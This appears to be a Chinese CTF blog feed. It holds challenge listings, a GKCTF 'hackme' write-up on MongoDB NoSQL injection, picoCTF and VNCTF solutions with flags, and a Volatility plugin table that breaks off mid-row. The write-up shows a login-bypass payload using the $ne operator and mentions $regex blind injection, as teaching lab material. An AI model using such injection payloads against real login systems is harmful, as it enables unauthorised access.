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</p><p><img src="/images/others/image-20230401172512705.png" alt="image-20230401172512705"></p><p>flag:flag{a20cb3c9-141c-41c4-8255-0cd3eb95b681}</p><p>Beyond</p><p>未解答分值 : 500分</p><p>在某个国家级行动中，作为蓝队研判一哥的老张捕获到了一个神秘流量，直觉告诉他这不简单，于是他将这个流量保存了下来，你能协助他发现其中的秘密吗？</p><p><strong>AreYouOK</strong></p><p>在一次神秘行动中，特工老张的手机遭到了破坏，不过好在还有小米手环，组织向他的手环发送了行动指令，你能协助分析其中的秘密吗？flag格式为flag{Battery_Message}</p><p><a href="https://pan.baidu.com/s/1nGvszy3VWD1SKUs3-zwtGw">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/CUe5Gph5">备用下载</a></p><p>lose the key</p><p>未解答分值 : 157分</p><p>题目内容：lose my key，get my like。</p><p><a href="https://pan.baidu.com/s/1lUE0VcUSLnb2zyK4WcxGEQ">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/ZvlmiWMe">备用下载</a></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>nooblog</p><p>未解答分值 : 500分</p><p>I am just a logic noob trying to talk logically.</p><p><a href="https://pan.baidu.com/s/1gxLc9lbq7mpqjD3G8u-1uw">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/z7QclIYK">备用下载</a></p><p><img src="/images/others/image-20230401174456161.png" alt="image-20230401174456161"></p><p><img src="/images/others/image-20230401174257354.png" alt="image-20230401174257354"></p><p><img src="/images/others/image-20230401174445075.png" alt="image-20230401174445075"></p><p>1、【提前下载】挑战区一.rar：<a href="https://pan.baidu.com/s/1js3lac6myNUN1LZ0Fvplig">https://pan.baidu.com/s/1js3lac6myNUN1LZ0Fvplig</a> 提取码：GAME md5值：051dbbe806e36d921a579f3a1db16aba 挑战区二.zip：<a href="https://pan.baidu.com/s/119wfiZlc3yw11qMKZWuylQ">https://pan.baidu.com/s/119wfiZlc3yw11qMKZWuylQ</a> 提取码：GAME md5值：c1fff7d2bb8fea7698157267dc16ca0d （解压密码将在比赛时对应题目描述里）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF-2021-hackme</title>
      <link href="/2023/03/29/GKCTF-2021-hackme/"/>
      <url>/2023/03/29/GKCTF-2021-hackme/</url>
      
        <content type="html"><![CDATA[<p>复现地址：<a href="https://buuoj.cn/challenges#[GKCTF%202021]hackme">https://buuoj.cn/challenges#[GKCTF%202021]hackme</a></p><p>直接访问靶机是一个登录界面</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230329165150877.png" alt="image-20230329165150877"></p><p>给了提示：unicode   ,   注意server和其配置文件</p><p>右键查看源代码，可以看到一个注释，<!--doyounosql?-->，这里是三个单词而不是四个，do you nosql？</p><h5 id="什么是-Nosql"><a href="#什么是-Nosql" class="headerlink" title="什么是 Nosql"></a>什么是 Nosql</h5><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。在现代的计算系统上每天网络上都会产生庞大的数据量。这些数据有很大一部分是由关系数据库管理系统（RDBMS）来处理。 通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术。</p><p>NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p><h5 id="什么是-MongoDB"><a href="#什么是-MongoDB" class="headerlink" title="什么是 MongoDB"></a>什么是 MongoDB</h5><p>MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。</p><p>MongoDB 将数据存储为一个文档，数据结构由键值（key=&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;bohemian&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : <span class="number">19</span>,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Nosql-注入的简介"><a href="#Nosql-注入的简介" class="headerlink" title="Nosql 注入的简介"></a>Nosql 注入的简介</h5><p>NoSQL 注入由于 NoSQL 本身的特性和传统的 SQL 注入有所区别。使用传统的SQL注入，攻击者利用不安全的用户输入来修改或替换应用程序发送到数据库引擎的 SQL 查询语句（或其他SQL语句）。<br>换句话说，SQL 注入使攻击者可以在数据库中 SQL 执行命令。</p><p>与关系数据库不同，NoSQL 数据库不使用通用查询语言。NoSQL 查询语法是特定于产品的，查询是使用应用程序的编程语言编写的：PHP，JavaScript，Python，Java 等。这意味着成功的注入使攻击者不仅可以在数据库中执行命令，而且可以在应用程序本身中执行命令，这可能更加危险。</p><ul><li><strong>重言式注入</strong></li></ul><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p><p>默认用户输入账号密码后的username password 为这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bohemian&amp;password=<span class="number">657260</span></span><br></pre></td></tr></table></figure><p>进入 PHP 后的程序数据如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;bohemian&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;657260&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>为一个数组，将此带到入到mongodb中为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.users.find(&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;bohemian&#x27;</span>, <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;657260&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>在mongodb中有一些条件操作符，</p><ul><li><p><code>$eq</code>: (equal)等于</p></li><li><p><code>$gt</code>：(greater than)大约</p></li><li><p><code>$gte</code>: (greater than equal)大约等于</p></li><li><p><code>$in</code>：等于数组中的某一项，{field:{$in:{value1,value2…}}}</p></li><li><p><code>$lt</code>：(less than)小于</p></li><li><p><code>$lte</code>：(less than equal)小于等于</p></li><li><p><code>$ne</code>：(not equal)不等于</p></li><li><p><code>$nin</code>：(not in)不等于数组中的任何一项</p><p>如</p></li></ul><p>//查询age = 22的记录</p><p>db.userInfo.find({“age”: 22});</p><p>//相当于：select * from userInfo where age = 22;</p><p>//查询age &gt; 22的记录</p><p>db.userInfo.find({age: {$gt: 22}});</p><p>//相当于：select * from userInfo where age &gt; 22;</p><p>如果当我们输入username[$ne]=1时，就会成为</p><p>username=array($ne=&gt;1)  == ‘username’:{$ne:1}</p><p>带入到mongodb中db.users.find({‘username’:{$ne:1}, ‘password’:{$ne:1}})</p><p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> nosql </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF-2023-部分wp</title>
      <link href="/2023/03/27/picoCTF-2023-%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/03/27/picoCTF-2023-%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/2023picoctf/image-20230327161915650.png" alt="image-20230327161915650"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h4><p>访问页面，是一个登录的页面，账号密码<code>test/test!</code></p><p>抓包看到跳转到一个页面，</p><p><img src="/images/2023picoctf/image-20230327162639364.png"></p><p><img src="/images/2023picoctf/image-20230327162802078.png" alt="image-20230327162802078"></p><p>访问这个/next-page/id=cGljb0NURntwcm94aWVzX2Fs</p><p><img src="/images/2023picoctf/image-20230327162857583.png" alt="image-20230327162857583"></p><p>抓包，中间又会跳转一个页面，直接跳出来一个页面，看到有一个id，好像是base64，直接拼接</p><p><img src="/images/2023picoctf/image-20230327164821310.png" alt="image-20230327164821310"></p><p>flag:picoCTF{proxies_all_the_way_a0fe074f}</p><h4 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h4><p>How to automate tasks to run at intervals on linux servers?</p><p>机翻：如何自动执行任务以在 Linux 服务器上定期运行？</p><p>给了账号密码端口，直接连上去</p><p>定时任务的命令  crontab  ，执行crontab -l 发现没有，crontab的文件目录在/etc/下  以cron开头，</p><p><img src="/images/2023picoctf/image-20230327165914627.png" alt="image-20230327165914627"></p><p>在 challenge目录下也有flag</p><p><img src="/images/2023picoctf/image-20230327170454662.png" alt="image-20230327170454662"></p><p>flag:{“flag”: “picoCTF{Sch3DUL7NG_T45K3_L1NUX_1d781160}”, “username”: “picoplayer”, “password”: “dd4yT2bR</p><h4 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h4><p>Every file gets a flag.<br>The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what</p><p>机翻一下：每个文件都有一个标志。<br>SOC 分析师看到一张图像在两个人之间来回发送。 他们决定展开调查，发现事情远不止于此</p><p>直接下载一张图片</p><p>foremost 有一个zip包</p><p><img src="/images/2023picoctf/image-20230327173305594.png" alt="image-20230327173305594"></p><p><img src="/images/2023picoctf/image-20230327173324858.png" alt="image-20230327173324858"></p><p>ristretto flag.png</p><p><img src="/images/2023picoctf/image-20230327173335655.png" alt="image-20230327173335655"></p><p>flag:pIcoCTF{Hiddinng_An_imag3_within_@n_ima9e_96539bea}</p><h4 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h4><p>正则匹配</p><p>输入框输入东西，</p><p><img src="/images/2023picoctf/image-20230327204642026.png" alt="image-20230327204642026"></p><p>p开头 F结尾</p><table><thead><tr><th><a href="https://www.runoob.com/jsref/jsref-regexp-ncaret.html">^n</a></th><th>匹配任何开头为 n 的字符串。</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><img src="/images/2023picoctf/image-20230327204620651.png" alt="image-20230327204620651"></p><p>flag:picoCTF{succ3ssfully_matchtheregex_0694f25b}</p><h4 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h4><h4 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h4><p>Flag format: picoCTF{Malwarename}The first letter of the malware name should be capitalized and the rest lowercase.Your friend just got hacked and has been asked to pay some bitcoins to <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code>. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of?</p><p>标记格式：picoCTF{Malwarename}<br>恶意软件名称的首字母应大写，其余字母小写。<br>您的朋友刚刚被黑客入侵，并被要求向 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX 支付一些比特币。 他似乎不明白发生了什么，并向你征求意见。 你能确定他是哪种恶意软件的受害者吗？</p><p><img src="/images/2023picoctf/image-20230327222153657.png" alt="image-20230327222153657"></p><p>flag:picoCTF{Petya}</p><h4 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h4><p>下载文件，拖到ida</p><p><img src="/images/2023picoctf/image-20230327224136231.png" alt="image-20230327224136231"></p><p>base64 多解几次</p><p><img src="/images/2023picoctf/image-20230327224302506.png" alt="image-20230327224302506"></p><p>flag:picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_9b59b35c}</p><h4 id="rule"><a href="#rule" class="headerlink" title="rule"></a>rule</h4><p><img src="/images/2023picoctf/image-20230327224727627.png" alt="image-20230327224727627"></p><p>flag:picoCTF{h34rd_und3r5700d_4ck_cba1c711}</p><h4 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h4><p>下载pacp包，中间有个base解一下</p><p>这个是下面压缩包的密码</p><p>再解一下，就可以了</p><p><img src="/images/2023picoctf/image-20230328162924061.png" alt="image-20230328162924061"></p><p>picoCTF{R34DING_LOKd_fil56_succ3ss_419835ef}</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><p>直接拖到ida里</p><h3 id="safe-opener2"><a href="#safe-opener2" class="headerlink" title="safe opener2"></a>safe opener2</h3><p>直接拖到ida</p><h3 id="timer"><a href="#timer" class="headerlink" title="timer"></a>timer</h3><p>拖到Androidkill里</p><p>找到buildconfig文件即可</p><p><img src="/images/2023picoctf/image-20230328205729022.png" alt="image-20230328205729022"></p><p>flag:picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2023</title>
      <link href="/2023/02/18/VNCTF2023/"/>
      <url>/2023/02/18/VNCTF2023/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="象棋王子"><a href="#象棋王子" class="headerlink" title="象棋王子"></a>象棋王子</h4><p>顾名思义，应该是下象棋的，我们可以下，太菜了，js直接翻<br><a href="http://236f7cc1-466c-4d47-abf8-21b4ffc92cf7.node4.buuoj.cn:81/js/play.js">http://236f7cc1-466c-4d47-abf8-21b4ffc92cf7.node4.buuoj.cn:81/js/play.js</a><br>在play.js中  下面有jsfuck</p><p><img src="/imanges/others/image-20230218114910836.png" alt="image-20230218114910836"></p><p><img src="/imanges/others/image-20230218114953833.png" alt="image-20230218114953833"></p><p>直接复制所有，到浏览器console中，即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>volatility常用命令</title>
      <link href="/2023/02/17/volatility%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/02/17/volatility%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>参考</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4</span><br><span class="line">https://blog.csdn.net/u011250160/article/details/120473177</span><br></pre></td></tr></table></figure><h3 id="volatility2"><a href="#volatility2" class="headerlink" title="volatility2"></a>volatility2</h3><h4 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块 #"></a>常用模块 <a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97">#</a></h4><table><thead><tr><th><strong>插件名称</strong></th><th><strong>功能</strong></th></tr></thead><tbody><tr><td>amcache</td><td>查看AmCache应用程序痕迹信息</td></tr><tr><td>apihooks</td><td>检测内核及进程的内存空间中的API hook</td></tr><tr><td>atoms</td><td>列出会话及窗口站atom表</td></tr><tr><td>atomscan</td><td>Atom表的池扫描(Pool scanner)</td></tr><tr><td>auditpol</td><td>列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</td></tr><tr><td>bigpools</td><td>使用BigPagePoolScanner转储大分页池(big page pools)</td></tr><tr><td>bioskbd</td><td>从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</td></tr><tr><td>cachedump</td><td>获取内存中缓存的域帐号的密码哈希</td></tr><tr><td>callbacks</td><td>打印全系统通知例程</td></tr><tr><td>clipboard</td><td>提取Windows剪贴板中的内容</td></tr><tr><td>cmdline</td><td>显示进程命令行参数</td></tr><tr><td>cmdscan</td><td>提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）</td></tr><tr><td>connections</td><td>打印系统打开的网络连接(仅支持Windows XP 和2003)</td></tr><tr><td>connscan</td><td>打印TCP连接信息</td></tr><tr><td>consoles</td><td>提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）</td></tr><tr><td>crashinfo</td><td>提取崩溃转储信息</td></tr><tr><td>deskscan</td><td>tagDESKTOP池扫描(Poolscaner)</td></tr><tr><td>devicetree</td><td>显示设备树信息</td></tr><tr><td>dlldump</td><td>从进程地址空间转储动态链接库</td></tr><tr><td>dlllist</td><td>打印每个进程加载的动态链接库列表</td></tr><tr><td>driverirp</td><td>IRP hook驱动检测</td></tr><tr><td>drivermodule</td><td>关联驱动对象至内核模块</td></tr><tr><td>driverscan</td><td>驱动对象池扫描</td></tr><tr><td>dumpcerts</td><td>提取RAS私钥及SSL公钥</td></tr><tr><td>dumpfiles</td><td>提取内存中映射或缓存的文件</td></tr><tr><td>dumpregistry</td><td>转储内存中注册表信息至磁盘</td></tr><tr><td>editbox</td><td>查看Edit编辑控件信息 (Listbox正在实验中)</td></tr><tr><td>envars</td><td>显示进程的环境变量</td></tr><tr><td>eventhooks</td><td>打印Windows事件hook详细信息</td></tr><tr><td>evtlogs</td><td>提取Windows事件日志（仅支持XP/2003)</td></tr><tr><td>filescan</td><td>提取文件对象（file objects）池信息</td></tr><tr><td>gahti</td><td>转储用户句柄（handle）类型信息</td></tr><tr><td>gditimers</td><td>打印已安装的GDI计时器(timers)及回调(callbacks)</td></tr><tr><td>gdt</td><td>显示全局描述符表(Global Deor Table)</td></tr><tr><td>getservicesids</td><td>获取注册表中的服务名称并返回SID信息</td></tr><tr><td>getsids</td><td>打印每个进程的SID信息</td></tr><tr><td>handles</td><td>打印每个进程打开的句柄的列表</td></tr><tr><td>hashdump</td><td>转储内存中的Windows帐户密码哈希(LM/NTLM)</td></tr><tr><td>hibinfo</td><td>转储休眠文件信息</td></tr><tr><td>hivedump</td><td>打印注册表配置单元信息</td></tr><tr><td>hivelist</td><td>打印注册表配置单元列表</td></tr><tr><td>hivescan</td><td>注册表配置单元池扫描</td></tr><tr><td>hpakextract</td><td>从HPAK文件（Fast Dump格式）提取物理内存数据</td></tr><tr><td>hpakinfo</td><td>查看HPAK文件属性及相关信息</td></tr><tr><td>idt</td><td>显示中断描述符表(Interrupt Deor Table)</td></tr><tr><td>iehistory</td><td>重建IE缓存及访问历史记录</td></tr><tr><td>imagecopy</td><td>将物理地址空间导出原生DD镜像文件</td></tr><tr><td>imageinfo</td><td>查看/识别镜像信息</td></tr><tr><td>impscan</td><td>扫描对导入函数的调用</td></tr><tr><td>joblinks</td><td>打印进程任务链接信息</td></tr><tr><td>kdbgscan</td><td>搜索和转储潜在KDBG值</td></tr><tr><td>kpcrscan</td><td>搜索和转储潜在KPCR值</td></tr><tr><td>ldrmodules</td><td>检测未链接的动态链接DLL</td></tr><tr><td>lsadump</td><td>从注册表中提取LSA密钥信息（已解密）</td></tr><tr><td>machoinfo</td><td>转储Mach-O 文件格式信息</td></tr><tr><td>malfind</td><td>查找隐藏的和插入的代码</td></tr><tr><td>mbrparser</td><td>扫描并解析潜在的主引导记录(MBR)</td></tr><tr><td>memdump</td><td>转储进程的可寻址内存</td></tr><tr><td>memmap</td><td>打印内存映射</td></tr><tr><td>messagehooks</td><td>桌面和窗口消息钩子的线程列表</td></tr><tr><td>mftparser</td><td>扫描并解析潜在的MFT条目</td></tr><tr><td>moddump</td><td>转储内核驱动程序到可执行文件的示例</td></tr><tr><td>modscan</td><td>内核模块池扫描</td></tr><tr><td>modules</td><td>打印加载模块的列表</td></tr><tr><td>multiscan</td><td>批量扫描各种对象</td></tr><tr><td>mutantscan</td><td>对互斥对象池扫描</td></tr><tr><td>notepad</td><td>查看记事本当前显示的文本</td></tr><tr><td>objtypescan</td><td>扫描窗口对象类型对象</td></tr><tr><td>patcher</td><td>基于页面扫描的补丁程序内存</td></tr><tr><td>poolpeek</td><td>可配置的池扫描器插件</td></tr><tr><td>printkey</td><td>打印注册表项及其子项和值</td></tr><tr><td>privs</td><td>显示进程权限</td></tr><tr><td>procdump</td><td>进程转储到一个可执行文件示例</td></tr><tr><td>pslist</td><td>按照EPROCESS列表打印所有正在运行的进程</td></tr><tr><td>psscan</td><td>进程对象池扫描</td></tr><tr><td>pstree</td><td>以树型方式打印进程列表</td></tr><tr><td>psxview</td><td>查找带有隐藏进程的所有进程列表</td></tr><tr><td>qemuinfo</td><td>转储Qemu 信息</td></tr><tr><td>raw2dmp</td><td>将物理内存原生数据转换为windbg崩溃转储格式</td></tr><tr><td>screenshot</td><td>基于GDI Windows的虚拟屏幕截图保存</td></tr><tr><td>servicediff</td><td>Windows服务列表(ala Plugx)</td></tr><tr><td>sessions</td><td>_MM_SESSION_SPACE的详细信息列表(用户登录会话)</td></tr><tr><td>shellbags</td><td>打印Shellbags信息</td></tr><tr><td>shimcache</td><td>解析应用程序兼容性Shim缓存注册表项</td></tr><tr><td>shutdowntime</td><td>从内存中的注册表信息获取机器关机时间</td></tr><tr><td>sockets</td><td>打印已打开套接字列表</td></tr><tr><td>sockscan</td><td>TCP套接字对象池扫描</td></tr><tr><td>ssdt</td><td>显示SSDT条目</td></tr><tr><td>strings</td><td>物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</td></tr><tr><td>svcscan</td><td>Windows服务列表扫描</td></tr><tr><td>symlinkscan</td><td>符号链接对象池扫描</td></tr><tr><td>thrdscan</td><td>线程对象池扫描</td></tr><tr><td>threads</td><td>调查_ETHREAD 和_KTHREADs</td></tr><tr><td>timeliner</td><td>创建内存中的各种痕迹信息的时间线</td></tr><tr><td>timers</td><td>打印内核计时器及关联模块的DPC</td></tr><tr><td>truecryptmaster</td><td>恢复TrueCrypt 